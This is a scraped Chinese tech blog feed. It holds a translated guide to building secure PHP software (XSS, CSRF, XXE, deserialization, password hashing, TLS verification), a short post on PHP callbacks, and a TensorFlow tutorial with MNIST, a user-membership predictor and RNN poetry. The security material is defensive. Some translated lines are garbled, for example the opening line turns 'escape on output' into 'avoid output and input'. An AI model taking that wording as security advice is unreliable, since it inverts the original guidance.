尽量避免输出和输入（Always escape on output, never on input）。如果你把已清洗的数据（sanitized data）保存在数据库，然后在其它地方被发现了 SQL 注入漏洞，攻击者将通过恶意程序污染这些受信任的已清洗数据（trusted-to-be-sanitized record），从而绕开 XSS 保护。 如果你的框架有一个提供自动上下文过滤的模板引擎，那就使用它吧。这些工作可由框架安全地做到。 echo htmlentities（$ string，ENT_QUOTES | ENT_HTML5，&#39;UTF-8&#39;） 是一种安全、有效的方法阻止UTF-8编码的网页上的所有 XSS 攻击，但不是任何 HTML 都有效。 如果你的环境要求你使用 Markdown 而不是 HTML ，那就不要使用 HTML 了。 如果你需要使用原生 HTML（没有使用模板引擎），参阅第一点，并且使用 HTML Purifier 吧。HTML Purifier 不适合转义为 HTML 属性上下文（HTML attribute context）。 跨站请求伪造跨站请求伪造（CSRF）是一种混淆的代理攻击，通过诱导用户的浏览器代表攻击者执行恶意的 HTTP 请求（使用的是该用户的权限）。 这在一般情况下是很容易解决的，只需两步： 使用 HTTPS 。这是先决条件。没有 HTTPS 的话，任何保护措施都是脆弱的，虽然 HTTPS 本身并不防御 CSRF 。 增加基本的 Challenge-response authentication。 为每个表单添加一个隐藏的表单属性。 填充一个密码安全的随机值（称为令牌）。 验证是否提供了隐藏的表单属性，以及是否匹配上期望值。 我们写了一个名为 Anti-CSRF 的库，并且： 你可以使每个令牌只能使用一次，以防止重放攻击。 多个令牌存储在后端。 一旦令牌获取完，令牌会循环使用。 每个令牌可以绑定特定的 URL 。 如果某个令牌泄露了，它不能在不同的上下文使用。 令牌可以绑定特定的 IP 地址。 v2.1 后，令牌可以重复使用（例如供 Ajax 使用）。 如果你没有使用防止 CSRF 漏洞的框架，请将 Anti-CSRF 放在一边。在不久的将来，SameSite cookies将允许我们更简单地避免CSRF攻击。 XML 攻击 (XXE, XPath Injection)在处理大量 XML 的应用程序中存在两个主要的漏洞： XML External Entities (XXE) XPath 注入 除此之外_Processing)， XXE 攻击可用作包含攻击代码的本地/远程文件的启动器。 早期版本的 Google Docs 被着名于 XXE ，但除了在很大程度上使用 XML 的商业应用程序之外，基本闻所未闻。 针对 XXE 袭击的主要缓解措施: 12&lt;?phplibxml_disable_entity_loader(true); 除 XML 文档外，XPath注入与 SQL 注入非常相似。 幸运的是，将用户输入传递给 XPath 查询的情况在 PHP 生态中非常罕见。 而不幸的是，这也意味着 PHP 生态中不存在可用的最佳避免措施（预编译和参数化 XPath 查询）。最好的办法是在任何涉及 XPath 查询的数据上设置允许使用的字符白名单。 123456789101112131415161718192021222324252627282930&lt;?phpdeclare(strict_types=1);class SafeXPathEscaper&#123; /** * @param string $input * @return string */ public static function allowAlphaNumeric(string $input): string &#123; return \\preg_replace('#[^A-Za-z0-9]#', '', $input); &#125; /** * @param string $input * @return string */ public static function allowNumeric(string $input): string &#123; return \\preg_replace('#[^0-9]#', '', $input); &#125;&#125;// Usage:$selected = $xml-&gt;xpath( \"/user/username/\" . SafeXPathEscaper::allowAlphaNumeric( $_GET['username'] )); 白名单总会比黑名单更安全。 反序列化和 PHP 对象注入 深入： 在PHP中安全地实现（反）序列化 如果你将不可信的数据传递给unserialize()，则通常是这两个结果之一： PHP 对象注入，它能用于启动 POP 链（POP chain）并触发其他误用对象的漏洞。 PHP 解释器本身的内存损坏。 大多数开发人员更喜欢使用JSON序列化，这是对其软件安全状况的显著改进。但请记住，json_decode()容易受到散列冲突拒绝服务（Hash-DoS）攻击。不幸的是，PHP的Hash-DOS问题还没有得到彻底解决。 从djb33迁移到Siphash，对于字符串输入，哈希输出的最高位设置为 1 ，对于整数输入设置为 0 ，使用CSPRNG提供的请求密钥，将完全解决这些攻击。 不幸的是， PHP 团队还没有准备好放弃他们已经在 PHP 7 系列中取得的性能提升，所以很难说服他们放弃 djb33 （这是非常快但不安全的） 赞成 SipHash （这也是快速的，但不像 djb33 那么快，但更安全）。 如果性能受到重大影响，可能会阻碍未来版本的采用，但也影响了安全性。 因此，最好的办法是： 使用JSON，因为它比unserialize()更安全。 在任何可能的地方，确保输入在反序列化之前被认证。 对于提供给用户的数据，通过一个只有服务器知道的秘钥使用sodium_crypto_auth()和sodium_crypto_auth_verify()验证。 对于第三方提供的数据，让他们使用 1sodium_crypto_sign() 签名他们的 JSON 消息，然后使用 1sodium_crypto_sign_open() 和第三方公钥验证消息。 如果你需要对传输的签名进行十六进制或 Base64 位编码，也可以使用分离的签名 API 。 如果你无法验证 JSON 字符串，请严格限制速度并阻止 IP 地址，以减轻重复的违规者。 密码散列 深入：2016 年，如何安全地保存用户密码 安全的密码存储曾经是一个激烈争论的话题，但现在实现起来相当微不足道，特别是在 PHP 中： 123456789&lt;?php$hash = \\password_hash($password, PASSWORD_DEFAULT);if (\\password_verify($password, $hash)) &#123; // Authenticated. if (\\password_needs_rehash($hash, PASSWORD_DEFAULT)) &#123; // Rehash, update database. &#125;&#125; 你甚至不需要知道在后台使用什么算法，因为如果你使用最新版本的 PHP ，你也将使用当前最新的技术，用户的密码将会自动进行升级（只要有新的默认算法可用）。 无论你做什么，都不要做 WordPress 所做的事情。 从 PHP 5.5 到 7.2 ，默认算法都是 Bcrypt 。在未来，它可能会切换到获得密码哈希大赛冠军的 Argon2 。 如果你以前没有使用password_* API ，那需要迁移遗留哈希，请确保以这种方式进行。很多公司搞错了， 最有名的是雅虎。 最近，错误地实施传统哈希升级似乎导致了苹果的iamroot错误。 通用加密这是一些我们详细写了的话题： Using Encryption and Authentication Correctly (2015) Recommended: Choosing the Right Cryptography Library for your PHP Project: A Guide (2015) Recommended: You Wouldn’t Base64 a Password - Cryptography Decoded (2015) Cryptographically Secure PHP Development (2017) Recommended: Libsodium Quick Reference: Similarly-Named Functions and Their Use-Cases (2017) 一般来说，你总是希望使用 Sodium cryptography library（libsodium）进行应用层加密。如果你需要支持早于 7.2 的 PHP 版本（像 5.2.4），你可以使用sodium_compat，基本上可以假设你的用户也是 7.2 。 在特定情况下，由于严格的算法选择和互操作性，你可能需要不同的库。如有疑问，请咨询密码专家和密码工程师，了解密码选择是否安全（这是我们提供的服务之一）。 随机性 深入：如何在 PHP 中生成安全的整数和字符串？ 如果你需要随机数字，请使用random_int()。如果你需要随机字节字符串，请使用random_bytes()。不要使用mt_rand()，rand()或uniqid()。 如果你需要从秘密种子（secret seed）生成伪随机数（pseudorandom），请使用SeedSpring，而不是srand()或mt_srand()。 12345678&lt;?phpuse ParagonIE\\SeedSpring\\SeedSpring;$seed = random_bytes(16);$rng = new SeedSpring($seed);$data = $rng-&gt;getBytes(1024);$int = $rng-&gt;getInt(1, 100); 服务器端 HTTPS 请求 确保 TLS 证书验证没有被禁用 随意使用你已经熟悉的任何兼容 PSR-7 的 HTTP 客户端。 我们喜欢 Guzzle ，有些人喜欢直接使用 cURL 。 无论你最终使用什么，请确保使用的确定性，以确保始终可以拥有最新的 CACert 软件包，从而允许启用最严格的 TLS 证书验证设置并保护服务器的出站 HTTPS 请求。 安装 Certainty 很简单： 1composer require paragonie/certainty:^1 使用 Certainty 也很简单： 12345678910111213141516171819&lt;?php use ParagonIE\\Certainty\\RemoteFetch; $latestCACertBundle = (new RemoteFetch())-&gt;getLatestBundle(); # cURL users: $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); curl_setopt($ch, CURLOPT_CAINFO, $latestCACertBundle-&gt;getFilePath()); # Guzzle users: /** @var \\GuzzleHttp\\Client $http */ $repsonse = $http-&gt;get( 'https://example.com', [ 'verify' =&gt; $latestCACertBundle-&gt;getFilePath() ] ); 这样可以保护你免受网络服务器与集成的任何第三方 API 之间的中间人攻击。 我们真的需要 Certainty 吗？ 保护你的系统， Certainty 并不是严格的要求。缺少它并不是什么漏洞。但如果没有 Certainty ，开源软件必须猜测操作系统的 CACert 软件包的存在位置，如果猜测错误，它往往会失败并导致可用性问题。从历史上看，这激励了许多开发人员只是禁用证书验证，以便他们的代码“正常工作”，却没有意识到他们只是将应用程序变成主动攻击。 Certainty 通过将 CACert 捆绑在最新的可预测位置来消除这种激励。 Certainty 还为希望运行自己的内部 CA 为企业提供大量的工具。 谁禁用了证书验证？ 流行的内容管理系统（WordPress，Magento 等 CMS）的插件/扩展开发者！这是我们试图在生态系统层面上解决的一个巨大的问题。 它不是孤立的任何特定的 CMS ，你会发现这些不安全的插件等都是类似的。 如果使用了类似的 CMS ，请在插件中搜索CURLOPT_SSL_VERIFYPEER和CURLOPT_SSL_VERIFYHOST，你可能会发现有几个将这些值设置为FALSE。 避免的事情 不要使用mcrypt。这是一个十多年来没有开发出来的密码学库。如果你遵循我们的 PHP 版本建议，这应该是一个容易避免的错误，因为mcrypt不再被 PHP 7.2 和更新的版本支持。 配置驱动的安全建议应该大部分地忽略。如果你正在阅读 PHP 安全性指南，并告诉你更改 php.ini 设置而不是编写更好的代码，那么你可能正在阅读过时的建议。关闭窗口并转到一些和register_globals无关的文章上吧。 不要使用 JOSE（JWT，JWS，JWE），这是一套互联网标准，它编纂了一系列容易出错的密码设计。尽管由于某种原因，被写入了标准，也吸引了很多传道人。 加密 URL 参数是公司常用来模糊元数据的反模式（例如，我们有多少用户？）。 它带来了实施错误的高风险，也造成了错误的安全感。我们在链接的文章中提出了一个更安全的选择。 除非迫不得已，否则不要提供“我忘记了我的密码”的功能。 不要讳言：密码重置功能是一个后门。 有一些方法可以实施以抵御合理的威胁模型，但高风险用户应该不被考虑。 避免使用 RSA，改用 libsodium 。如果你必须使用 RSA ，请确保指定 OAEP 填充。 12345678 &lt;?php openssl_private_decrypt( $ciphertext, $decrypted, // Plaintext gets written to this variable upon success, $privateKey, OPENSSL_PKCS1_OAEP_PADDING // Important: DO NOT OMIT THIS!); 如果你不得不使用 PKCS＃1 v1.5 填充，那么无论你与哪个集成在一起，几乎肯定会受到 ROBOT 的影响，请以允许明文泄露和签名伪造的漏洞将其报告给相应的供应商（或 US-CERT ）。 专业用法现在你已经掌握了在 2018 年及以后构建安全 PHP 应用程序的基础知识，接下来我们来看一些更专业的用法。 可搜索的加密 深入：使用PHP和SQL构建可搜索的加密数据库 可搜索的加密数据库是可取的，但被广泛认为是不太可能实现的。上面链接的博客文章试图通过改进我们解决方案来实现，但本质上是这样的： 设计你的架构，以便数据库（database compromise）不会让攻击者访问你的加密密钥。 用一个密钥加密数据。 基于 HMAC 或具有静态盐的安全 KDF （secure KDF with a static salt）创建多个索引（具有自己独特的密钥） 可选：截断步骤3的输出，将其用作布隆过滤器（Bloom filter） 在 SELECT 查询中使用步骤3或4的输出 解密结果。 在这个过程中的任何一步，你都可以根据实际使用情况进行不同的权衡。 没有 Side-Channels 的基于令牌的身份验证 深入： Split Tokens: Token-Based Authentication Protocols without Side-Channels 说到数据库（上一节），你是否知道 SELECT 查询理论上可能是定时信息泄漏的来源？ 简单的缓解措施： 把你的认证令牌分为两半 一半在 SELECT 查询中使用 后一半在恒定的时间（constant-time）验证 可以选择将后半部分的散列存储在数据库中。这对于只能使用一次的令牌是有意义的，例如 密码重置或“在此计算机上记住我”的令牌 即使可以使用定时泄漏来窃取一半的令牌，剩下的也需要暴力破解才能成功。 开发安全的API 深入： Hardening Your PHP-Powered APIs with Sapient 我们写了 SAPIENT （the Secure API ENgineering Toolkit），让服务器到服务器验证的消息传递变得简单易行。除了 HTTPS 提供的安全性之外，Sapient允许你使用共享密钥或公钥来加密和验证消息。 这使得即使存在中间攻击者，并设有流氓证书颁发机构，你也可以使用Ed25519对 API 请求和响应进行身份验证，或者将消息加密到只能由接收方服务器的密钥解密的目标服务器。 由于每个 HTTP 消息体都通过安全密码进行身份验证，所以可以安全地使用它来代替stateful token juggling protocols（例如 OAuth）。但是，在密码学方面，在做任何不规范的事情之前，总要确保他们的实现是由专家研究的。 所有Sapient使用的密码算法都由Sodium cryptography library提供。 进一步阅读： Sapient Documentation Sapient Tutorial Sapient Specification Paragon Initiative Enterprises已经在其许多产品（包括许多开源软件项目）中使用了Sapient， 并将继续添加软件项目到Sapient用户群中。 使用Chronicle记录安全事件 深入： Chronicle Will Make You Question the Need for Blockchain Technology Chronicle是一个基于散列链数据结构的仅追加密码分类账（append-only cryptographic ledger），具有很多吸引公司“区块链”技术的属性，而不会过分矫枉过正。 除了仅追加密码分类账（append-only cryptographic ledger）这个具有创造性的用例之外，Chronicle集成到SIEM中时，也可以十分有亮点，因为你可以将安全关键事件发送到私人Chronicle中，并且它们是不能被改变的。 如果你的Chronicle设置为将其摘要散列交叉签名到其他Chronicle实例，或者如果有其他实例配置为复制你的Chronicle内容，攻击者就很难篡改你的安全事件日志。 在Chronicle的帮助下，你可以获得区块链所承诺的弹性特性（resilience），而没有任何隐私，性能或可伸缩性问题。 要将数据发布到本地Chronicle，你可以使用任何与Sapient-compatible API，但最简单的解决方案称为Quill。 作者的一些话一些聪明的读者可能注意到我们引用了很多我们自己的工作，包括博客文章和开源软件。（当然也不仅仅引用了我们自己的工作） 这绝不是偶然的。 自从我们在 2015 年初成立以来，一直在编写安全库并参与提高 PHP 生态系统安全性的工作。我们已经涉足了很多领域，而且我们的安全工程师（他们最近推动了更安全的加密技术加入 PHP 核心，就在最近的 PHP 7.2 中）自我担保地说，并不擅长自我炒作，或是对已经做过的工作持续热情。但你很可能没有听说我们多年来开发的工具或库。对于这个，深感抱歉。 不论如何，我们也不可能成为各方面的先行者，所以我们尽可能地选择与重视公共利益而不是贪图小利的行业专家工作。 这也是为什么浏览器安全的许多章节都参考了 Scott Helme 和他公司的工作，他们在为开发人员提供这些新的安全功能方面具有可访问性和可理解性。 本指南当然不会是详尽的。编写不安全代码的方法几乎和编写代码的方法一样多。 安全是一种心态，而不是目的地。 随着上面所写的一切，以及后面涉及的资源，我们希望这将有助于全世界的开发人员，从今天开始用 PHP 编写安全的软件。 资源如果你已经按照本页上的所有内容进行了操作，并且需要更多内容，则可能会对我们策划的阅读列表感兴趣，以便学习应用程序安全性。 如果你认为自己编写的代码足够安全，并希望我们从安全工程师的角度对其进行评判，这也是我们为客户提供的服务。 你如果为一家要进行合规性测试（PCI-DSS，ISO 27001等）的公司工作，可能还想聘请我们公司来审核你的源代码。我们的流程比其他安全咨询公司更适合开发者。 接下来是 PHP 和信息安全社区提供的资源列表，这些资源帮助互联网更加安全。 PHP: The Right Way：现代 PHP 开发的实用指南，免费在线。 Mozilla’s SSL Config Generator Let’s Encrypt：证书颁发机构，通过提供免费 TLS 证书，为创建更安全的 Internet 做了很多。 Qualys SSL Labs：为 TLS 配置提供了一个快速而简单的测试套件。几乎每个人都使用这个来解决他们的密码组和证书问题，理由很充分：It does its job well. Security Headers：可以检验你的网站在使用浏览器安全功能来保护用户方面的表现如何。 Report-URI：一个很好的免费资源，提供监控 CSP/HPKP 等安全策略的实时安全报告服务。他们给你一个 Report-URI，你可以传递给你的用户的浏览器，如果有什么事情发生或有人发现 XSS 攻击媒介，他们会投诉Report-URI。 Report-URI 会汇总这些错误，并允许你更好地对这些报告进行疑难解答和分类。 PHP Security Advent Calenda：RIPSTech旗下的团队负责。 Snuffleupagus：一个面向安全的 PHP 模块（Suhosin的精神继承者，似乎在很大程度上会被放弃） PHP Delusions：一个致力于更好地使用 PHP 的网站。大部分的口吻是非常有见地的，作者对技术的准确性和清晰度的奉献使得值得一读，特别是对于那些不太喜欢 PDO 功能的人来说。 Have I Been Pwned?：帮助用户发现他们的数据是否属于过时数据泄露。 结尾原文地址：The 2018 Guide to Building Secure PHP Software - P.I.E. Staff 最早是在Laravel China社区里帖子 - The 2018 Guide to Building Secure PHP Software看到，一位同学只发了原链接，由于是全英，文章也比较长，就没有深读，但可以知道这是一篇很好的文章，值得学习，这几天花了时间翻译了全文。 为避免歧义，部分专业名词和语句保留了原文。翻译过程借助了 Google 和 Google 翻译，本人英文和相关专业水平有限，如有错误感谢指出修正。 翻译版权所有: 癞蛤蟆想吃炖大鹅 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证）","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.twosee.cn/tags/php/"},{"name":"security","slug":"security","permalink":"http://www.twosee.cn/tags/security/"},{"name":"hack","slug":"hack","permalink":"http://www.twosee.cn/tags/hack/"}]},{"title":"4种PHP回调函数","slug":"PHP-callback","date":"2018-01-03T21:47:33.000Z","updated":"2018-01-08T07:19:25.000Z","comments":true,"path":"2018/01/04/PHP-callback/","link":"","permalink":"http://www.twosee.cn/2018/01/04/PHP-callback/","excerpt":"","text":"以Swoole服务事件回调为例 匿名函数123$server-&gt;on('Request', function ($req, $resp) &#123; echo \"hello world\";&#125;); 类静态方法1234567class A &#123; static function test($req, $resp)&#123; echo \"hello world\"; &#125;&#125;$server-&gt;on('Request', 'A::Test');$server-&gt;on('Request', array('A', 'Test')); 函数1234function my_onRequest($req, $resp)&#123; echo \"hello world\";&#125;$server-&gt;on('Request', 'my_onRequest'); 对象方法12345678class A &#123; function test($req, $resp)&#123; echo \"hello world\"; &#125;&#125;$object = new A();$server-&gt;on('Request', array($object, 'test'));","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://www.twosee.cn/tags/PHP/"}]},{"title":"人人都可以做深度学习应用 加强篇","slug":"AI-everyone-plus","date":"2018-01-03T21:40:56.000Z","updated":"2018-01-08T07:19:53.000Z","comments":true,"path":"2018/01/04/AI-everyone-plus/","link":"","permalink":"http://www.twosee.cn/2018/01/04/AI-everyone-plus/","excerpt":"经典入门demo：识别手写数字（MNIST）常规的编程入门有“Hello world”程序，而深度学习的入门程序则是MNIST，一个识别28×28像素的图片中的手写数字的程序。 备注：MNIST 的数据和官网 深度学习的内容，其背后会涉及比较多的数学原理，作为一个初学者，受限于我个人的数学和技术水平，也许并不足以准确讲述相关的数学原理，因此，本文会更多的关注“应用层面”，不对背后的数学原理进行展开，感谢谅解。","text":"经典入门demo：识别手写数字（MNIST）常规的编程入门有“Hello world”程序，而深度学习的入门程序则是MNIST，一个识别28×28像素的图片中的手写数字的程序。 备注：MNIST 的数据和官网 深度学习的内容，其背后会涉及比较多的数学原理，作为一个初学者，受限于我个人的数学和技术水平，也许并不足以准确讲述相关的数学原理，因此，本文会更多的关注“应用层面”，不对背后的数学原理进行展开，感谢谅解。 1. 加载数据 img 程序执行的第一步当然是加载数据，根据我们之前获得的数据集主要包括两部分：60000的训练数据集（mnist.train）和10000的测试数据集（mnist.test）。里面每一行，是一个28×28=784的数组，数组的本质就是将28×28像素的图片，转化成对应的像素点阵。 例如手写字1的图片转换出来的对应矩阵表示如下： img 之前我们经常听说，图片方面的深度学习需要大量的计算能力，甚至需要采用昂贵、专业的GPU（Nvidia的GPU），从上述转化的案例我们就已经可以获得一些答案了。一张784像素的图片，对学习模型来说，就有784个特征，而我们实际的相片和图片动辄几十万、百万级别，则对应的基础特征数也是这个数量级，基于这样数量级的数组进行大规模运算，没有强大的计算能力支持，确实寸步难行。当然，这个入门的MNIST的demo还是可以比较快速的跑完。 Demo中的关键代码（读取并且加载数据到数组对象中，方便后面使用）： img 2. 构建模型MNIST的每一张图片都表示一个数字，从0到9。而模型最终期望获得的是：给定一张图片，获得代表每个数字的概率。比如说，模型可能推测一张数字9的图片代表数字9的概率是80%但是判断它是8的概率是5%（因为8和9都有上半部分的小圆），然后给予它代表其他数字的概率更小的值。 img MNIST的入门例子，采用的是softmax回归(softmax regression)，softmax模型可以用来给不同的对象分配概率。为了得到一张给定图片属于某个特定数字类的证据（evidence），我们对图片的784个特征（点阵里的各个像素值）进行加权求和。如果某个特征（像素值）具有很强的证据说明这张图片不属于该类，那么相应的权重值为负数，相反如果某个特征（像素值）拥有有利的证据支持这张图片属于这个类，那么权重值是正数。类似前面提到的房价估算例子，对每一个像素点作出了一个权重分配。 假设我们获得一张图片，需要计算它是8的概率，转化成数学公式则如下： img 公式中的i代表需要预测的数字（8），代表预测数字为8的情况下，784个特征的不同权重值，代表8的偏置量（bias），X则是该图片784个特征的值。通过上述计算，我们则可以获得证明该图片是8的证据（evidence）的总和，softmax函数可以把这些证据转换成概率 y。（softmax的数学原理，辛苦各位查询相关资料哈） 将前面的过程概括成一张图（来自官方）则如下： img 不同的特征x和对应不同数字的权重进行相乘和求和，则获得在各个数字的分布概率，取概率最大的值，则认为是我们的图片预测结果。 将上述过程写成一个等式，则如下： img 该等式在矩阵乘法里可以非常简单地表示，则等价为： img 不展开里面的具体数值，则可以简化为： img 如果我们对线性代数中矩阵相关内容有适当学习，其实，就会明白矩阵表达在一些问题上，更易于理解。如果对矩阵内容不太记得了，也没有关系，后面我会附加上线性代数的视频。 虽然前面讲述了这么多，其实关键代码就四行： img 上述代码都是类似变量占位符，先设置好模型计算方式，在真实训练流程中，需要批量读取源数据，不断给它们填充数据，模型计算才会真实跑起来。tf.zeros则表示，先给它们统一赋值为0占位。X数据是从数据文件中读取的，而w、b是在训练过程中不断变化和更新的，y则是基于前面的数据进行计算得到。 3. 损失函数和优化设置为了训练我们的模型，我们首先需要定义一个指标来衡量这个模型是好还是坏。这个指标称为成本（cost）或损失（loss），然后尽量最小化这个指标。简单的说，就是我们需要最小化loss的值，loss的值越小，则我们的模型越逼近标签的真实结果。 Demo中使用的损失函数是“交叉熵”（cross-entropy），它的公式如下： img y 是我们预测的概率分布, y’ 是实际的分布（我们输入的)，交叉熵是用来衡量我们的预测结果的不准确性。TensorFlow拥有一张描述各个计算单元的图，也就是整个模型的计算流程，它可以自动地使用反向传播算法(backpropagation algorithm)，来确定我们的权重等变量是如何影响我们想要最小化的那个loss值的。然后，TensorFlow会用我们设定好的优化算法来不断修改变量以降低loss值。 其中，demo采用梯度下降算法（gradient descent algorithm）以0.01的学习速率最小化交叉熵。梯度下降算法是一个简单的学习过程，TensorFlow只需将每个变量一点点地往使loss值不断降低的方向更新。 对应的关键代码如下： img 备注内容： 交叉熵 反向传播 在代码中会看见one-hot vector的概念和变量名，其实这个是个非常简单的东西，就是设置一个10个元素的数组，其中只有一个是1，其他都是0，以此表示数字的标签结果。例如表示数字3的标签值：[0,0,0,1,0,0,0,0,0,0] 4. 训练运算和模型准确度测试通过前面的实现，我们已经设置好了整个模型的计算“流程图”，它们都成为TensorFlow框架的一部分。于是，我们就可以启动我们的训练程序，下面的代码的含义是，循环训练我们的模型500次，每次批量取50个训练样本。 img 其训练过程，其实就是TensorFlow框架的启动训练过程，在这个过程中，python批量地将数据交给底层库进行处理。我在官方的demo里追加了两行代码，每隔50次则额外计算一次当前模型的识别准确率。它并非必要的代码，仅仅用于方便观察整个模型的识别准确率逐步变化的过程。 img 当然，里面涉及的accuracy（预测准确率）等变量，需要在前面的地方定义占位： img 当我们训练完毕，则到了验证我们的模型准确率的时候，和前面相同： img 我的demo跑出来的结果如下（softmax回归的例子运行速度还是比较快的），当前的准确率是0.9252： img 5. 实时查看参数的数值的方法刚开始跑官方的demo的时候，我们总想将相关变量的值打印出来看看，是怎样一种格式和状态。从demo的代码中，我们可以看见很多的Tensor变量对象，而实际上这些变量对象都是无法直接输出查看，粗略地理解，有些只是占位符，直接输出的话，会获得类似如下的一个对象： 1Tensor(&quot;Equal:0&quot;, shape=(?,), dtype=bool) 既然它是占位符，那么我们就必须喂一些数据给它，它才能将真实内容展示出来。因此，正确的方法是，在打印时通常需要加上当前的输入数据给它。 例如，查看y的概率数据： 1print(sess.run(y, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;)) 部分非占位符的变量还可以这样输出来： 1print(W.eval()) 总的来说，92%的识别准确率是比较令人失望，因此，官方的MNIST其实也有多种模型的不同版本，其中比较适合图片处理的CNN(卷积神经网络)的版本，可以获得99%以上的准确率，当然，它的执行耗时也是比较长的。 （备注：cnn_mnist.py就是卷积神经网络版本的，后面有附带微云网盘的下载url） 前馈神经网络（feed-forward neural network）版本的MNIST，可达到97%： img 分享在微云上的数据和源码：http://url.cn/44aZOpP （备注：国外网站下载都比较慢，我这份下载相对会快一些，在环境已经搭建完毕的情况下，执行里面的run.py即可） 五、和业务场景结合的demo：预测用户是否是超级会员身份根据前面的内容，我们对上述基于softmax只是三层（输入、处理、输出）的神经网络模型已经比较熟悉，那么，这个模型是否可以应用到我们具体的业务场景中，其中的难度大吗？为了验证这一点，我拿了一些现网的数据来做了这个试验。 1. 数据准备 img 我将一个现网的电影票活动的用户参与数据，包括点击过哪些按钮、手机平台、IP地址、参与时间等信息抓取了出来。其实这些数据当中是隐含了用户的身份信息的，例如，某些礼包的必须是超级会员身份才能领取，如果这个按钮用户点击领取成功，则可以证明该用户的身份肯定是超级会员身份。当然，我只是将这些不知道相不相关的数据特征直观的整理出来，作为我们的样本数据，然后对应的标签为超级会员身份。 用于训练的样本数据格式如下： img 第一列是QQ号码，只做认知标识的，第二列表示是否超级会员身份，作为训练的标签值，后面的就是IP地址，平台标志位以及参与活动的参与记录（0是未成功参与，1表示成功参与）。则获得一个拥有11个特征的数组（经过一些转化和映射，将特别大的数变小）： [0.9166666666666666, 0.4392156862745098, 0.984313725490196, 0.7411764705882353, 0.2196078431372549, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0] 对应的是否是超级数据格式如下，作为监督学习的标签： 超级会员：[0, 1]非超级会员：[1, 0] 这里需要专门解释下，在实际应用中需要做数据转换的原因。一方面，将这些数据做一个映射转化，有助于简化数据模型。另一方面，是为了规避NaN的问题，当数值过大，在一些数学指数和除法的浮点数运算中，有可能得到一个无穷大的数值，或者其他溢出的情形，在Python里会变为NaN类型，这个类型会破坏掉后续全部计算结果，导致计算异常。例如下图，就是特征数值过大，在训练过程中，导致中间某些参数累计越来越大，最终导致产生NaN值，后续的计算结果全部被破坏掉： img 而导致NaN的原因在复杂的数学计算里，会产生无穷大或者无穷小。例如，在我们的这个demo中，产生NaN的原因，主要是因为softmax的计算导致。 img RuntimeWarning: divide by zero encountered in log 刚开始做实际的业务应用，就发现经常跑出极奇怪异的结果（遇到NaN问题，我发现程序也能继续走下去），几经排查才发现是NAN值问题，是非常令人沮丧的。当然，经过仔细分析问题，发现也并非没有排查的方式。因为，NaN值是个奇特的类型，可以采用下述编码方式NaN != NaN来检测自己的训练过程中，是否出现的NaN。 关键程序代码如下： img 我采用上述方法，非常顺利地找到自己的深度学习程序，在学习到哪一批数据时产生的NaN。因此，很多原始数据我们都会做一个除以某个值，让数值变小的操作。例如官方的MNIST也是这样做的，将256的像素颜色的数值统一除以255，让它们都变成一个小于1的浮点数。 MNIST在处理原始图片像素特征数据时，也对特征数据进行了变小处理： img NaN值问题一度深深地困扰着我（往事不堪回首-__-!!），特别放到这里，避免入门的同学踩坑。 2. 执行结果 我准备的训练集（6700）和测试集（1000）数据并不多，不过，超级会员身份的预测准确率最终可以达到87%。虽然，预测准确率是不高，这个可能和我的训练集数据比较少有关系，不过，整个模型也没有花费多少时间，从整理数据、编码、训练到最终跑出结果，只用了2个晚上的时间。 img 下图是两个实际的测试例子，例如，该模型预测第一个QQ用户有82%的概率是非超级会员用户，17.9%的概率为超级会员用户（该预测是准确的）。 img 通过上面的这个例子，我们会发觉其实对于某些比较简单的场景下应用，我们是可以比较容易就实现的。 六、其他模型1. CIFAR-10识别图片分类的demo（官方） CIFAR-10数据集的分类是机器学习中一个公开的基准测试问题，它任务是对一组32x32RGB的图像进行分类，这些图像涵盖了10个类别：飞机， 汽车， 鸟， 猫， 鹿， 狗， 青蛙， 马， 船和卡车。 这也是官方的重要demo之一。 img 更详细的介绍内容： The CIFAR-10 dataset 卷积神经网络 该例子执行的过程比较长，需要耐心等待。 我在机器上的执行过程和结果： cifar10_train.py用于训练： img cifar10_eval.py用于检验结果： img 识别率不高是因为该官方模型的识别率本来就不高： img 另外，官方的例子我首次在1月5日跑的时候，还是有一些小问题的，无法跑起来（最新的官方可能已经修正），建议可以直接使用我放到微云上的版本（代码里面的log和读取文件的路径，需要调整一下）。 源码下载：http://url.cn/44mRzBh 微云盘里，不含训练集和测试集的图片数据，但是，程序如果检测到这些图片不存在，会自行下载： img 2. 是否大于5岁的测试demo 为了检验softma回归模型是否能够学习到一些我自己设定好的规则，我做了一个小demo来测试。我通过随机数生成的方式构造了一系列的数据，让前面的softmax回归模型去学习，最终看看模型能否通过训练集的学习，最终100%预测这个样本数据是否大于5岁。 模型和数据本身都比较简单，构造的数据的方式： 我随机构造一个只有2个特征纬度的样本数据，[year, 1]，其中year随机取值0-10，数字1是放进去作为干扰。 如果year大于5岁，则标签设置为：[0, 0, 1]； 否则，标签设置为：[0, 1, 0]。 生成了6000条假训练集去训练该模型，最终它能做到100%成功预测准确： img 微云下载（源码下载）：http://url.cn/44mKFNK 3. 基于RNN的古诗学习 最开头的AI写古诗，非常令人感到惊艳，那个demo是美国的一个研究者做出来的，能够根据主题生成不能的古诗，而且古诗的质量还比较高。于是，我也尝试在自己的机器上也跑一个能够写古诗的模型，后来我找到的是一个基于RNN的模型。RNN循环神经网络(Recurrent Neural Networks)，是非常常用的深度学习模型之一。我基于一个外部的demo，进行一些调整后跑起一个能够学习古诗和写古诗的比较简单的程序。 执行写诗（让它写了十首）： 抑滴留居潋罅斜，二川还羡五侯家。古刘称士身相染，桃李栽林欲称家。回首二毛相喘日，万当仙性尽甘无。如何羽马嘶来泪，不信红峰一寸西。 废寺松阴月似空，垂杨风起晚光催。乌心不把嫌香径，出定沧洲几好清。兰逐白头邻斧蝶，苍苍归路自清埃。渔樵若欲斜阳羡，桂苑西河碧朔来。 遥天花落甚巫山，凤珮飞驰不骋庄。翠初才象饮毫势，上月朱炉一重牛。香催戍渚同虚客，石势填楼取蕊红。佳句旧清箱畔意，剪颜相激菊花繁。 江上萧条第一取，名长经起月还游。数尺温皋云战远，放船乡鬼蘸云多。相逢槛上西风动，莫听风烟认钓鱼。堤费禽雏应昨梦，去朝从此满玄尘。 